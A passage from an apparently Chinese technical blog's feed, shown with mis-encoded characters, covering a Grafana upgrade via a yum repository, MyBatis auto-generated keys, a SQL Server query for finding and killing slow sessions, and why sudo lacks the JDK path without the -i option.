<h3 id="æ›´æ–°yumæº"><a href="#æ›´æ–°yumæº" class="headerlink" title="æ›´æ–°yumæº"></a>æ›´æ–°yumæº</h3><p>aliyunçš„yumçš„æœ€æ–°ç‰ˆæœ¬æ˜¯<code>4.6.3</code>æ˜¯æˆ‘ä»¬å½“å‰ä½¿ç”¨çš„ç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ grafanaçš„æº<a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></p>
<p>æ–°å»ºé…ç½®æ–‡ä»¶<code>/etc/yum.repos.d/grafana.repo</code></p>
<p>é”®å…¥ä¸€ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[grafana]</span></span><br><span class="line"><span class="attr">name</span>=grafana</span><br><span class="line"><span class="attr">baseurl</span>=https://packages.grafana.com/oss/rpm</span><br><span class="line"><span class="attr">repo_gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgkey</span>=https://packages.grafana.com/gpg.key</span><br><span class="line"><span class="attr">sslverify</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">sslcacert</span>=/etc/pki/tls/certs/ca-bundle.crt</span><br></pre></td></tr></table></figure>
<p>grafanaä¹Ÿæä¾›äº†betaçš„æºï¼Œç”Ÿäº§ç¯å¢ƒä¸å»ºè®®ä½¿ç”¨ã€‚</p>
<p>å†æ¬¡æŸ¥çœ‹yumä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br><span class="line"></span><br><span class="line">Available Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 5.4.2</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 52 M</span><br><span class="line">Repo        : grafana</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥æ‹¿åˆ°<code>5.4.2</code>çš„ä¿¡æ¯äº†</p>
<h3 id="å‡çº§ç‰ˆæœ¬"><a href="#å‡çº§ç‰ˆæœ¬" class="headerlink" title="å‡çº§ç‰ˆæœ¬"></a>å‡çº§ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum update grafana</span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®reminder"><a href="#é…ç½®reminder" class="headerlink" title="é…ç½®reminder"></a>é…ç½®reminder</h2><p><img src="image-20190110234737778.png" alt="image-20190110234737778"></p>
<p>è¿™æ ·å¦‚æœå¤„äºalertçŠ¶æ€å°±ä¼šæ¯éš”30sæŠ¥ä¸€æ¬¡</p>
<p><img src="image-20190110234843905.png" alt="image-20190110234843905"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://github.com/grafana/grafana/issues/12356" rel="external nofollow noopener noreferrer" target="_blank">Send alert notification for every alert eval regardless of state Â· Issue #12356 Â· grafana/grafana</a></li>
<li><a href="http://docs.grafana.org/installation/upgrading/" rel="external nofollow noopener noreferrer" target="_blank">Upgrading | Grafana Documentation</a></li>
<li><a href="https://github.com/grafana/grafana/issues/7277" rel="external nofollow noopener noreferrer" target="_blank">[Question] Alert notify only once ? Â· Issue #7277 Â· grafana/grafana</a></li>
<li><a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> grafana </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mybatis-get-generated-id]]></title>
      <url>http://qsli.github.io/2019/01/06/mybatis-get-generated-id/</url>
      <content type="html"><![CDATA[<h2 id="mybatisè·å–è‡ªå¢ä¸»é”®"><a href="#mybatisè·å–è‡ªå¢ä¸»é”®" class="headerlink" title="mybatisè·å–è‡ªå¢ä¸»é”®"></a>mybatisè·å–è‡ªå¢ä¸»é”®</h2><h3 id="ä½¿ç”¨useGeneratedKeys"><a href="#ä½¿ç”¨useGeneratedKeys" class="headerlink" title="ä½¿ç”¨useGeneratedKeys"></a>ä½¿ç”¨useGeneratedKeys</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>useGeneratedKeys</code>æ—¢å¯ä»¥ç”¨äºå•æ¡æ’å…¥è¯­å¥ä¸­è·å–è‡ªå¢ä¸»é”®ï¼Œä¹Ÿå¯ä»¥ç”¨äºå¤šæ¡è¯­å¥ä¸­è·å–è‡ªå¢ä¸»é”®ã€‚</p>
<h3 id="ä½¿ç”¨-IDENTITY"><a href="#ä½¿ç”¨-IDENTITY" class="headerlink" title="ä½¿ç”¨@@IDENTITY"></a>ä½¿ç”¨@@IDENTITY</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span> <span class="attr">order</span>=<span class="string">"AFTER"</span> <span class="attr">resultType</span>=<span class="string">"java.lang.Integer"</span>&gt;</span></span><br><span class="line">			select @@IDENTITY</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åªæ”¯æŒä¸€æ¡æ’å…¥æ—¶è·å–è‡ªå¢ä¸»é”®ï¼Œè€Œä¸”è·Ÿæ•°æ®åº“çš„æ”¯æŒæœ‰å…³.</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="https://www.cnblogs.com/fsjohnhuang/p/4078659.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatisé­”æ³•å ‚ï¼šInsertæ“ä½œè¯¦è§£ï¼ˆè¿”å›ä¸»é”®ã€æ‰¹é‡æ’å…¥ï¼‰ - ^_^è‚¥ä»”John - åšå®¢å›­</a></li>
<li><a href="https://buptubuntu.github.io/2017/07/16/Mybatis-Auto-Generate-Key/" rel="external nofollow noopener noreferrer" target="_blank">Mybatis Auto Generate Key | buptubuntuçš„åšå®¢</a></li>
<li><a href="http://www.mybatis.org/generator/configreference/generatedKey.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis Generator Core â€“ The <generatedkey> Element</generatedkey></a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> mybatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> è‡ªå¢ä¸»é”® </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqlserveræ€æ‰æ…¢æŸ¥è¯¢]]></title>
      <url>http://qsli.github.io/2018/10/09/sqlserver-slow-killer/</url>
      <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>æŸ¥è¯¢æ…¢æŸ¥è¯¢çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">    <span class="keyword">SUBSTRING</span>(qt.TEXT, (er.statement_start_offset/<span class="number">2</span>)+<span class="number">1</span>, ((<span class="keyword">CASE</span> er.statement_end_offset <span class="keyword">WHEN</span> <span class="number">-1</span> <span class="keyword">THEN</span> <span class="keyword">DATALENGTH</span>(qt.TEXT) <span class="keyword">ELSE</span> er.statement_end_offset <span class="keyword">END</span> - er.statement_start_offset)/<span class="number">2</span>)+<span class="number">1</span>) <span class="keyword">AS</span> query_sql,</span><br><span class="line">    er.session_id <span class="keyword">AS</span> pid,</span><br><span class="line">    er.status <span class="keyword">AS</span> <span class="keyword">status</span>,</span><br><span class="line">    er.command <span class="keyword">AS</span> command,</span><br><span class="line">    sp.hostname <span class="keyword">AS</span> hostname,</span><br><span class="line">    DB_NAME(sp.dbid) <span class="keyword">AS</span> db_name,</span><br><span class="line">    sp.program_name <span class="keyword">AS</span> program_name,</span><br><span class="line">    er.cpu_time <span class="keyword">AS</span> cpu_time,</span><br><span class="line">    er.total_elapsed_time <span class="keyword">AS</span> cost_time</span><br><span class="line"><span class="keyword">FROM</span> sys.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> sys.dm_exec_requests <span class="keyword">AS</span> er <span class="keyword">ON</span> sp.spid = er.session_id</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">APPLY</span> sys.dm_exec_sql_text(er.sql_handle) <span class="keyword">AS</span> qt</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span> = <span class="keyword">CASE</span> <span class="keyword">WHEN</span> er.status <span class="keyword">IN</span> (<span class="string">'RUNNABLE'</span>, <span class="string">'SUSPENDED'</span>, <span class="string">'RUNNING'</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">WHEN</span> er.status = <span class="string">'SLEEPING'</span> <span class="keyword">AND</span> sp.open_tran  &gt; <span class="number">0</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span></span><br><span class="line"><span class="keyword">AND</span> er.command = <span class="string">'SELECT'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> er.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<img src="/2018/10/09/sqlserver-slow-killer/image-20181009091326051.png">
<p>ç»“æœä¸­å±•ç¤ºäº†sessionçš„<code>pid</code>ä»¥åŠæ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¶ˆè€—çš„cpuæ—¶é—´ä»¥åŠæ€»çš„è€—è´¹æ—¶é—´ï¼Œå¦‚æœéœ€è¦æ€æ‰è¿™ä¸ªsessionï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kill</span> &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/kill-transact-sql?view=sql-server-2017" rel="external nofollow noopener noreferrer" target="_blank">KILL (Transact-SQL) | Microsoft Docs</a></li>
<li><a href="https://gist.github.com/alexsorokoletov/a079629f9e1435c7f81f" rel="external nofollow noopener noreferrer" target="_blank">Helpful functions when you need to find out what is going on on SQL Server</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> db </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sqlserver-killer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sudoå‘½ä»¤çš„ç¯å¢ƒè·¯å¾„]]></title>
      <url>http://qsli.github.io/2018/10/07/sudo-path/</url>
      <content type="html"><![CDATA[<p>è¿è¡Œsudoå‘½ä»¤æ—¶ï¼Œæœ‰æ—¶ä¼šæç¤ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -u tomcat jstack 123</span><br><span class="line">sudo: jstack: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯æŸ¥çœ‹<code>/etc/profile</code>å¯ä»¥çœ‹åˆ°:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br></pre></td></tr></table></figure>
<p>ç¡®å®å¯¼å‡ºäº†ç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿è¡Œçš„æ—¶å€™ä¸æˆåŠŸå‘¢ï¼Ÿ</p>
<p>æ¢æˆå¦‚ä¸‹çš„å‘½ä»¤ï¼Œå¯ä»¥æ‰¾åˆ°:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i  -u tomcat jstack 123</span><br><span class="line">123: No such process</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æˆåŠŸçš„æ‰¾åˆ°äº†å‘½ä»¤ï¼ŒåŒºåˆ«åœ¨å“ªå„¿ï¼Ÿ</p>
<p>å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/home/tomcat/.<span class="built_in">local</span>/bin:/home/tomcat/bin</span><br><span class="line">MAIL=/var/spool/mail/tomcat</span><br><span class="line">PWD=/home/tomcat</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">SUDO_COMMAND=/bin/bash -c env</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">SUDO_GID=1024</span><br><span class="line">_=/bin/env</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>PATH</code>ä¸­åŒ…å«äº†<code>/usr/local/jdk/default/bin</code>ï¼Œè¿™ä¸ªæ˜¯jdkçš„<code>bin</code>ç›®å½•ï¼Œæ‰€ä»¥<code>jstack</code>å‘½ä»¤å¯ä»¥æ‰¾åˆ°</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo  -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">USER=tomcat</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">SUDO_COMMAND=/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">SUDO_GID=1024</span><br></pre></td></tr></table></figure>
<p>æ²¡æœ‰<code>-i</code>çš„ç¯å¢ƒå˜é‡å°±æ²¡æœ‰<code>JDK</code>çš„è·¯å¾„ã€‚</p>
<p>çœ‹ä¸‹<code>sudo</code>çš„manï¼š</p>
<blockquote>
<p>-i [command]<br>â€‹                The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that<br>â€‹                login-specific resource files such as .profile or .login will be read by the shell.  If a command is specified, it is passed to the shell for execution<br>â€‹                via the shellâ€™s -c option.  If no command is specified, an interactive shell is executed.  sudo attempts to change to that userâ€™s home directory before<br>â€‹                running the shell.  The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in.<br>â€‹                The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers<br>â€‹                policy is in use.</p>
</blockquote>
<p><code>/etc/profile</code>çš„é…ç½®ç¡®å®æ˜¯å…¨å±€çš„é…ç½®ï¼Œä½†æ˜¯è¿™ä¸ªåªæœ‰åœ¨<code>login shell</code>çš„æ—¶å€™æ‰ä¼šå»<code>source</code>ï¼Œæ‰ä¼šç”Ÿæ•ˆã€‚</p>
<p>å…³äºé›†ä¸­ç±»å‹çš„shellï¼Œå¯ä»¥æŸ¥é˜…æœ€åçš„å‚è€ƒé“¾æ¥ï¼Œè¿™é‡Œç®€å•åˆ—å‡ºä¸‹ï¼š</p>
<img src="/2018/10/07/sudo-path/BashStartupFiles1-8918135.png">
<ul>
<li><strong>login</strong> shell: A login shell logs you into the system as a spiecified user, necessary for this is a username and password. When you hit ctrl+alt+F1 to login into a virtual terminal you get after successful login: a login shell (that is interactive). Sourced files:<ul>
<li><code>/etc/profile</code> and <code>~/.profile</code> for Bourne compatible shells (and <code>/etc/profile.d/*</code>)</li>
<li><code>~/.bash_profile</code> for bash</li>
<li><code>/etc/zprofile</code> and <code>~/.zprofile</code> for zsh</li>
<li><code>/etc/csh.login</code> and <code>~/.login</code> for csh</li>
</ul>
</li>
<li><strong>non-login</strong> shell: A shell that is executed without logging in, necessary for this is a current logged in user. When you open a graphic terminal in gnome it is a non-login (interactive) shell. Sourced files:<ul>
<li><code>/etc/bashrc</code> and <code>~/.bashrc</code> for bash</li>
</ul>
</li>
